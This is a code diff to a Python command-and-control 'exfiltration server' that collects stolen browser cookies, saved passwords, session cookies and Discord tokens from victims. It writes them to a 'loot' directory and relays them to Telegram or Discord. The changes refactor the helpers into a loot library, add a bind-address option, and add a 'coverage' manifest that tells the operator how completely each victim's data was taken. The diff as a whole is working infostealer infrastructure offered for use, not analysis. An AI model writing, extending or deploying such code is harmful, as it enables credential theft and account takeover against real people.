@@ -23,6 +23,9 @@ Relay options (re-send received cookies to a second channel):
 import json, os, sys, time, socket, socketserver, threading, urllib.error, urllib.request, urllib.parse
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
+from cklog import coverage as coveragelib
+from cklog import loot as lootlib
+
 HERE   = os.path.dirname(os.path.abspath(__file__))
 LOOT   = os.path.join(HERE, "loot")
 os.makedirs(LOOT, exist_ok=True)
@@ -41,8 +44,9 @@ PWD_TXTF    = os.path.join(LOOT, "passwords.txt")
 SESS_JSONF  = os.path.join(LOOT, "session_cookies.json")
 SESS_TXTF   = os.path.join(LOOT, "session_cookies.txt")
 
-# Parse args: port, --telegram token:chat, --discord webhook
+# Parse args: port, --bind addr, --telegram token:chat, --discord webhook
 PORT = 8080
+BIND = "0.0.0.0"
 TELEGRAM = None  # "bot_token:chat_id"
 DISCORD = None  # webhook URL
 
@@ -54,6 +58,8 @@ while i < len(args):
         TELEGRAM = args[i + 1]; i += 2
     elif a == "--discord" and i + 1 < len(args):
         DISCORD = args[i + 1]; i += 2
+    elif a == "--bind" and i + 1 < len(args):
+        BIND = args[i + 1]; i += 2
     elif not a.startswith("--"):
         PORT = int(a); i += 1
     else:
@@ -91,14 +97,7 @@ def load_existing():
 def load_json(path):
     """Read one of the split output files. Passwords and session live in their
     own files -- reading all_cookies.json for them always returned []."""
-    if os.path.exists(path):
-        try:
-            with open(path, encoding="utf-8") as f:
-                data = json.load(f)
-            return data if isinstance(data, list) else []
-        except Exception:
-            pass
-    return []
+    return lootlib.load_json(path)
 
 
 def merge(old, new):
@@ -108,26 +107,7 @@ def merge(old, new):
     are name='password', path='/'), and cross-profile cookies overwrote each
     other. browser/profile/_username/receiving-host are part of the identity.
     """
-    seen, out = {}, list(old)
-
-    def key(c):
-        # Tokens are the exception: one victim can hold several Discord
-        # accounts in the same browser/profile and they must not collapse.
-        extra = c.get("value") if c.get("name") == "token" else None
-        return (c.get("_host"), c.get("browser"), c.get("profile"),
-                c.get("domain"), c.get("name"), c.get("path"),
-                c.get("_username"), extra, c.get("_partition"))
-
-    for i, c in enumerate(out):
-        seen[key(c)] = i
-    for c in new:
-        k = key(c)
-        if k in seen:
-            out[seen[k]] = c
-        else:
-            seen[k] = len(out)
-            out.append(c)
-    return out
+    return lootlib.merge(old, new, replace=True)
 
 
 # ------------------------------------------------------------------ relay channels
@@ -222,48 +202,30 @@ def relay_discord(cookies):
 SAVE_LOCK = threading.Lock()
 
 def write_json(rows):
-    with open(JSONF, "w", encoding="utf-8") as f:
-        json.dump(rows, f, ensure_ascii=False, indent=1)
+    lootlib.write_json(JSONF, rows)
 
 
 def expiry(c):
     """Payload writes expirationDate; cookielog.py writes expires. Never throw
     on a malformed value -- one bad record would abort the whole POST."""
-    try:
-        return int(c.get("expirationDate") or c.get("expires") or 0)
-    except (TypeError, ValueError):
-        return 0
+    return lootlib.expiry(c)
 
 
 def write_txt(rows):
-    lines = ["# Netscape HTTP Cookie File"]
-    for c in rows:
-        d = c.get("domain", "")
-        if not d.startswith("."):
-            d = "." + d
-        exp = expiry(c)
-        lines.append("\t".join([
-            d, "TRUE", c.get("path") or "/",
-            "TRUE" if c.get("secure") else "FALSE",
-            str(exp), c.get("name", ""), c.get("value") or ""
-        ]))
-    with open(TXTF, "w", encoding="utf-8") as f:
-        f.write("\n".join(lines) + "\n")
+    lootlib.write_txt(TXTF, rows)
 
 
 def filter_session(rows):
     """Return only real session cookies (no expiry, excluding passwords)."""
-    return [c for c in rows
-            if not expiry(c)
-            and c.get("name") != "password"]
+    return lootlib.filter_session(rows)
 
 def filter_passwords(rows):
     """Return only password entries (name == 'password')."""
-    return [c for c in rows if c.get("name") == "password"]
+    return lootlib.filter_passwords(rows)
 
 def filter_cookies(rows):
     """Return only actual cookies (name != 'password')."""
-    return [c for c in rows if c.get("name") != "password"]
+    return lootlib.filter_cookies(rows)
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -275,6 +237,7 @@ class Handler(BaseHTTPRequestHandler):
             data = json.dumps({"ok": True, "records": len(rows),
                                "passwords": len(load_json(PWD_JSONF)),
                                "session": len(load_json(SESS_JSONF)),
+                               "coverage": len(coveragelib.load_all(LOOT)),
                                "files": [JSONF, PWD_JSONF, SESS_JSONF]}).encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
@@ -292,6 +255,14 @@ class Handler(BaseHTTPRequestHandler):
         elif self.path == "/passwords":
             pwds = load_json(PWD_JSONF)
             data = json.dumps(pwds, ensure_ascii=False, indent=1).encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+        elif self.path == "/coverage":
+            rows = coveragelib.load_all(LOOT)
+            data = json.dumps(rows, ensure_ascii=False, indent=1).encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.send_header("Content-Length", str(len(data)))
@@ -351,7 +322,7 @@ class Handler(BaseHTTPRequestHandler):
             return
         body = self.rfile.read(length) if length > 0 else b"[]"
         try:
-            cookies = json.loads(body.decode("utf-8", "replace"))
+            payload = json.loads(body.decode("utf-8", "replace"))
         except Exception as ex:
             self.send_response(400)
             self.end_headers()
@@ -359,6 +330,14 @@ class Handler(BaseHTTPRequestHandler):
             print("[-] invalid JSON (%d bytes): %s" % (length, ex))
             return
 
+        # Two wire shapes: a bare list (all current payloads) and the stage-2
+        # envelope {"records": [...], "coverage": {...}}.
+        coverage = None
+        if isinstance(payload, dict):
+            coverage = payload.get("coverage")
+            cookies = payload.get("records") or payload.get("cookies") or []
+        else:
+            cookies = payload
         if not isinstance(cookies, list):
             cookies = [cookies]
         cookies = [c for c in cookies if isinstance(c, dict) and c.get("name")]
@@ -414,6 +393,13 @@ class Handler(BaseHTTPRequestHandler):
         with open(SESS_TXTF, "w", encoding="utf-8") as f:
             f.write("\n".join(sess_lines) + "\n")
 
+        # Coverage manifest: what the collector looked at and what it missed.
+        # Written next to the loot so a 960-cookie run can be read as 60% or 95%.
+        if coverage is not None:
+            m = coveragelib.manifest(coverage, host=victim)
+            coveragelib.append(LOOT, m)
+            print("[coverage] %s" % coveragelib.summarize(m))
+
         # summary
         top = {}
         new_pwds = 0
@@ -445,7 +431,7 @@ class Handler(BaseHTTPRequestHandler):
 
 
 def main():
-    print("[listen] exfiltration server on port %d (Ctrl+C to stop)" % PORT)
+    print("[listen] exfiltration server on %s:%d (Ctrl+C to stop)" % (BIND, PORT))
     print("[listen] cookies:  %s + %s" % (JSONF, TXTF))
     print("[listen] passwords: %s + %s" % (PWD_JSONF, PWD_TXTF))
     print("[listen] session:   %s + %s" % (SESS_JSONF, SESS_TXTF))
@@ -465,7 +451,7 @@ def main():
     TELEGRAM = telegram_preflight(TELEGRAM)
     if DISCORD:
         print("[listen] relay: Discord -> %s" % (DISCORD.split("/api/")[0] if "/api/" in DISCORD else DISCORD[:30]))
-    server = HTTPServerV4(("0.0.0.0", PORT), Handler)
+    server = HTTPServerV4((BIND, PORT), Handler)
     try:
         server.serve_forever()
     except KeyboardInterrupt:
